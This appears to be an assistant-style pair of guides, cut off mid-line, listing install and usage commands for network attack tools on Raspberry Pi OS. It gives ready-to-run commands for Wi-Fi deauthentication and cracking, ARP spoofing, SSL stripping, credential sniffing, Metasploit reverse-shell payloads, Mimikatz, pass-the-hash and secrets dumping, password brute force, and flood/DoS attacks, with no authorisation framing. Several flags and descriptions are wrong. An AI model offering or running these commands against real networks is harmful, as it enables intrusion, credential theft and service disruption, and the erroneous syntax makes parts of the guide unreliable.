Here's a comprehensive guide to installing, calling, and using these tools on Raspberry Pi OS Lite, including their main commands, options, flags, and parameters:

### NETWORK ANALYSIS TOOLS

1. **Nmap**
   ```bash
   # Install
   sudo apt update && sudo apt install nmap
   
   # Usage examples
   nmap -sS targetIP             # SYN scan
   nmap -O targetIP              # OS detection
   nmap -sV targetIP             # Version detection
   nmap -p- targetIP             # Scan all 65535 ports
   nmap -A targetIP              # Aggressive scan (OS + version + scripts + traceroute)
   nmap -T4 targetIP             # Timing template (0-5, higher is faster)
   nmap -oN output.txt targetIP  # Save output to file
   ```

2. **Netcat**
   ```bash
   # Install
   sudo apt update && sudo apt install netcat
   
   # Usage examples
   nc -l -p 1234                 # Listen on port 1234
   nc -v targetIP 80             # Connect to port 80 with verbose output
   nc -u targetIP 53             # UDP connection
   nc -w 3 targetIP 80           # Timeout after 3 seconds
   nc -zv targetIP 80            # Zero-I/O mode (port scanning)
   nc -x proxyIP:8080 targetIP  # Connect via HTTP proxy
   ```

3. **Wireshark CLI (tshark)**
   ```bash
   # Install
   sudo apt update && sudo apt install tshark
   
   # Usage examples
   tshark -i wlan0               # Capture on wlan0 interface
   tshark -i wlan0 -w capture.pcap    # Save capture to file
   tshark -r capture.pcap        # Read from file
   tshark -i wlan0 -f "tcp port 80"   # Filter for HTTP traffic
   tshark -i wlan0 -c 100        # Capture 100 packets then exit
   tshark -i wlan0 -Y "http.request" # Display filter for HTTP requests
   ```

4. **Aircrack-ng**
   ```bash
   # Install
   sudo apt update && sudo apt install aircrack-ng
   
   # Usage examples
   airodump-ng wlan0mon          # Scan for networks
   airodump-ng -c 6 --bssid MAC wlan0mon    # Capture on channel 6
   aircrack-ng -w wordlist.cap-01.cap    # Crack with wordlist
   aireplay-ng -0 5 -a MAC wlan0mon       # Deauthentication attack
   airmon-ng start wlan0           # Start monitor mode
   ```

5. **Scapy**
   ```bash
   # Install
   sudo apt update && sudo apt install python3-scapy
   
   # Usage examples
   sudo scapy                     # Start interactive mode
   echo "send(IP(dst='targetIP')/ICMP())" | sudo scapy   # Send single packet
   sudo scapy -H send(IP(dst='targetIP')/TCP(dport=80, flags='S')) # Send SYN
   sudo scapy -H sniff(iface='eth0', prn=lambda x: x.summary())   # Sniff packets
   ```

6. **Dnsmasq**
   ```bash
   # Install
   sudo apt update && sudo apt install dnsmasq
   
   # Usage examples
   sudo dnsmasq                   # Start with default settings
   sudo dnsmasq -C /etc/dnsmasq.conf # Use config file
   sudo dnsmasq -q                # Log to syslog
   sudo dnsmasq -d                # Debug mode (don't fork)
   sudo dnsmasq --test            # Test configuration
   ```

7. **tcpdump**
   ```bash
   # Install
   sudo apt update && sudo apt install tcpdump
   
   # Usage examples
   sudo tcpdump -i wlan0          # Capture on wlan0
   sudo tcpdump -i wlan0 -w capture.pcap    # Save to file
   sudo tcpdump -i wlan0 -c 100    # Capture 100 packets
   sudo tcpdump -i wlan0 -n        # Don't resolve hostnames
   sudo tcpdump -i wlan0 'tcp port 80'     # Filter HTTP traffic
   sudo tcpdump -i wlan0 -A        # Print packets in ASCII
   ```

8. **Hashcat**
   ```bash
   # Install
   sudo apt update && sudo apt install hashcat
   
   # Usage examples
   hashcat -m 0 hash.txt wordlist.txt     # Dictionary attack
   hashcat -m 0 -a 3 hash.txt ?a?a?a?a   # Mask attack
   hashcat -m 0 -r rule.txt hash.txt wordlist.txt  # Rule-based attack
   hashcat --benchmark                   # Run benchmarks
   hashcat -m 0 -O hash.txt wordlist.txt # Optimized kernels
   ```

9. **Bettercap**
   ```bash
   # Install
   sudo apt update && sudo apt install bettercap
   
   # Usage examples
   sudo bettercap -iface wlan0    # Start with wlan0
   sudo bettercap -eval "net.probe on; net.show"   # Probe and show hosts
   sudo bettercap -caplet http-req-dump    # Dump HTTP requests
   sudo bettercap -eval "set arp.spoof.fullduplex true; arp.spoof.targets on" # ARP spoofing
   ```

10. **MITMproxy**
    ```bash
    # Install
    sudo apt update && sudo apt install mitmproxy
    
    # Usage examples
    mitmproxy                         # Start interactive mode
    mitmdump                          # Command-line mode
    mitmproxy -p 8080                 # Listen on port 8080
    mitmproxy --mode reverse:http://targetIP   # Reverse proxy mode
    mitmdump -s script.py             # Run with inline script
    ```

11. **NGREP**
    ```bash
    # Install
    sudo apt update && sudo apt install ngrep
    
    # Usage examples
    sudo ngrep -d wlan0               # Listen on wlan0
    sudo ngrep -d wlan0 'GET'         # Filter HTTP GET requests
    sudo ngrep -d wlan0 -W byline     # Display whole lines
    sudo ngrep -d wlan0 -i 'user-agent'  # Case-insensitive search
    sudo ngrep -d wlan0 -O capture.pcap    # Save to pcap file
    ```

12. **Dsniff**
    ```bash
    # Install
    sudo apt update && sudo apt install dsniff
    
    # Usage examples
    sudo dsniff -i wlan0              # Sniff passwords
    sudo dsniff -m                    # Extract email addresses
    sudo dsniff -f filter.rules       # Use custom filter rules
    sudo dsniff -c                    # Capture in libpcap format
    sudo dsniff -n                    # Don't resolve IPs
    ```

13. **Hping3**
    ```bash
    # Install
    sudo apt update && sudo apt install hping3
    
    # Usage examples
    sudo hping3 -S targetIP -p 80     # Send SYN packets to port 80
    sudo hping3 --flood targetIP      # Flood mode
    sudo hping3 -1 targetIP           # ICMP mode
    sudo hping3 --rand-source targetIP   # Random source IP
    sudo hping3 -a MAC targetIP       # Spoof MAC address
    ```

14. **Zmap**
    ```bash
    # Install
    sudo apt update && sudo apt install zmap
    
    # Usage examples
    sudo zmap -p 80 -N 1000           # Scan 1000 IPs on port 80
    sudo zmap -p 80 -o results.txt    # Save output to file
    sudo zmap -p 80 -f saddr.ip      # Output only source IP
    sudo zmap -p 80 -B 10M           # Bandwidth limit 10Mbps
    sudo zmap -p 80 -c 10            # Target count of IPs
    ```

15. **Responder**
    ```bash
    # Install
    sudo apt update && sudo apt install responder
    
    # Usage examples
    sudo responder -I wlan0           # Start on interface wlan0
    sudo responder -I wlan0 -w        # Start WPAD server
    sudo responder -I wlan0 -f        # Analyze mode
    sudo responder -I wlan0 -v        # Verbose mode
    sudo responder -I wlan0 -r        # Enable rogue SMB server
    ```

16. **SSLstrip**
    ```bash
    # Install
    sudo apt update && sudo apt install sslstrip
    
    # Usage examples
    sudo sslstrip -l 8080             # Listen on port 8080
    sudo sslstrip -w log.txt          # Log to file
    sudo sslstrip -f                  # Force SSL stripping
    sudo sslstrip -k                  # Kill all SSL sessions
    sudo sslstrip -p                  # Log


Here's a comprehensive guide to installing, calling, and using these exploitation tools on Raspberry Pi OS Lite, including their main commands, options, flags, and parameters:

### EXPLOITATION TOOLS

1. **Metasploit Framework**
   ```bash
   # Install
   curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/config/metasploit-framework-packages.gpg.key | gpg --dearmor > /etc/apt/trusted.gpg.d/metasploit-framework.gpg
   echo "deb [arch=amd64,arm64,armhf] http://downloads.metasploit.com/data/releases/metasploit-framework/apt kali main" > /etc/apt/sources.list.d/metasploit-framework.list
   sudo apt update && sudo apt install metasploit-framework
   
   # Usage examples
   msfconsole                         # Start console
   msfconsole -q                     # Quiet mode
   msfconsole -r script.rc           # Run resource script
   msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o apk.apk  # Generate payload
   msfvenom -l formats               # List available formats
   msfvenom -p windows/meterpreter/reverse_tcp -f exe -o payload.exe  # Generate Windows payload
   ```

2. **SQLMap**
   ```bash
   # Install
   git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
   cd sqlmap && sudo pip3 install -r requirements.txt
   sudo ln -s "$(pwd)/sqlmap.py" /usr/local/bin/sqlmap
   
   # Usage examples
   sqlmap -u "http://target.com/page?id=1"   # Test URL
   sqlmap -u "http://target.com/page?id=1" --batch  # Non-interactive mode
   sqlmap -u "http://target.com/page?id=1" --dbs    # List databases
   sqlmap -u "http://target.com/page?id=1" --tables -D dbname  # List tables
   sqlmap -r request.txt                  # Load from request file
   sqlmap --tamper=space2comment -u "http://target.com/page?id=1"  # Use tamper script
   ```

3. **BeEF**
   ```bash
   # Install
   sudo apt update && sudo apt install beef-xss
   
   # Usage examples
   sudo beef-xss                       # Start BeEF with default config
   sudo beef-xss -x                    # Start without console
   sudo beef-xss -c /path/to/config.yaml  # Use custom config
   sudo beef-xss -p password           # Set UI password
   ```

4. **PowerSploit**
   ```bash
   # Install
   git clone https://github.com/PowerShellMafia/PowerSploit.git
   sudo cp -r PowerSploit /opt/
   
   # Usage examples (within PowerShell)
   Import-Module /opt/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1
   Invoke-Mimikatz                     # Execute Mimikatz
   Import-Module /opt/PowerSploit/CodeExecution/Invoke-Shellcode.ps1
   Invoke-Shellcode -Shellcode @(0x90,0x90,0xC3)  # Execute shellcode
   ```

5. **Empire**
   ```bash
   # Install
   git clone --depth 1 https://github.com/BC-SECURITY/Empire.git
   cd Empire && sudo ./install.sh
   
   # Usage examples
   ./empire                           # Start Empire server
   ./empire --rest                   # Start with RESTful API
   ./empire --reset                   # Reset database
   listeners                          # In Empire: list listeners
   agents                             # In Empire: list agents
   usestager windows/ducky            # In Empire: use stager
   ```

6. **CrackMapExec**
   ```bash
   # Install
   git clone --depth 1 https://github.com/byt3bl33d3r/CrackMapExec.git
   cd CrackMapExec && sudo pip3 install -r requirements.txt
   sudo python3 setup.py install
   
   # Usage examples
   crackmapexec smb targetIP          # SMB with null session
   crackmapexec smb targetIP -u user -p pass  # With credentials
   crackmapexec smb 192.168.1.0/24 -u user -p pass  # Range scan
   crackmapexec smb targetIP -u users.txt -p passwords.txt  # Spray
   crackmapexec smb targetIP -u user -H hash  # Pass-the-hash
   crackmapexec smb targetIP --sam    # Dump SAM
   ```

7. **Responder** (already covered above, here for completeness)
   ```bash
   # Install
   sudo apt update && sudo apt install responder
   
   # Usage examples
   sudo responder -I wlan0           # Start on interface wlan0
   sudo responder -I wlan0 -w        # Start WPAD server
   sudo responder -I wlan0 -f        # Analyze mode
   sudo responder -I wlan0 -v        # Verbose mode
   sudo responder -I wlan0 -r        # Enable rogue SMB server
   ```

8. **John the Ripper**
   ```bash
   # Install
   sudo apt update && sudo apt install john
   
   # Usage examples
   john --wordlist=wordlist.txt hash.txt  # Dictionary attack
   john --incremental hash.txt            # Incremental mode
   john --show hash.txt                   # Show cracked passwords
   john --single hash.txt                 # Single crack mode
   john --rules --wordlist=wordlist.txt hash.txt  # Rules with wordlist
   ```

9. **Hashcat** (already covered above, here for completeness)
   ```bash
   # Install
   sudo apt update && sudo apt install hashcat
   
   # Usage examples
   hashcat -m 0 hash.txt wordlist.txt     # Dictionary attack
   hashcat -m 0 -a 3 hash.txt ?a?a?a?a   # Mask attack
   hashcat -m 0 -r rule.txt hash.txt wordlist.txt  # Rule-based attack
   hashcat --benchmark                   # Run benchmarks
   hashcat -m 0 -O hash.txt wordlist.txt # Optimized kernels
   ```

10. **Smbmap**
    ```bash
    # Install
    sudo apt update && sudo apt install smbmap
    
    # Usage examples
    smbmap -H targetIP                 # Enumerate shares
    smbmap -u user -p pass -H targetIP  # With credentials
    smbmap -u user -p pass -H targetIP -R shareName  # List files
    smbmap -u user -p pass -H targetIP --download 'folder\*'  # Download
    smbmap -u user -p pass -H targetIP --upload 'file.txt' 'share\path'  # Upload
    ```

11. **Impacket**
    ```bash
    # Install
    sudo apt update && sudo apt install python3-impacket
    # Or for full suite:
    git clone https://github.com/SecureAuthCorp/impacket.git
    cd impacket && sudo pip3 install .
    
    # Usage examples
    smbmap.py -H targetIP              # SMB enumeration
    secretsdump.py -just-dc -user user -pass pass -target-ip targetIP  # Dump secrets
    psexec.py user:pass@targetIP       # Execute command remotely
    atexec.py user:pass@targetIP 'whoami'  # Execute via task scheduler
    GetADUsers.py -all targetIP        # List all domain users
    wmiexec.py user:pass@targetIP      # Execute via WMI
    ```

12. **Hydra**
    ```bash
    # Install
    sudo apt update && sudo apt install hydra
    
    # Usage examples
    hydra -l user -P passwords.txt targetIP ssh   # SSH brute force
    hydra -L users.txt -p pass targetIP ftp     # FTP brute force
    hydra -s 443 -l admin -P pass.txt targetIP https-get  # HTTPS
    hydra -l admin -p pass targetIP rdp         # RDP brute force
    hydra -V -f -l admin -P pass.txt targetIP ssh  # Verbose, exit on success
    ```

13. **Routersploit**
    ```bash
    # Install
    git clone https://github.com/threat9/routersploit.git
    cd routersploit && sudo pip3 install -r requirements.txt
    sudo python3 rsf.py --install-dependencies
    
    # Usage examples
    sudo python3 rsf.py              # Start interactive console
    use scanners/autopwn            # In RouterSploit: use auto pwn scanner
    set target 192.168.1.1          # In RouterSploit: set target
    run                              # In RouterSploit: execute
    use exploits/routers/dlink/dir_300_614_exec  # In RouterSploit: use exploit
    ```

14. **Xerxes**
    ```bash
    # Install
    git clone https://github.com/zecurious/xerxes.py.git
    
    # Usage examples
    python3 xerxes.py targetIP 80     # DoS attack on port 80
    python


